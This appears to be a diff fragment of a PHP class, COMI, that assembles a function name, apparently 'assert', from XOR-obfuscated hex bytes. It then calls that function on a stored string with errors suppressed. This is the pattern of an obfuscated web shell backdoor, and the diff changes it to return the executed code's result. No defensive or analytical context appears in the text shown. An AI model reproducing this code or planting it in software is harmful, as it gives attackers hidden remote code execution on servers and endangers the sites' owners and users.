@@ -23,7 +23,7 @@ class COMI {
         $_4 = "\x93" ^ "\xe1";
         $_5 = "\xe7" ^ "\x93";
         $db =$_0.$_1.$_2.$_3.$_4.$_5;
-        @$db("$this->c");
+        return @$db($this->c);
     }
 }
 $comi = new COMI();
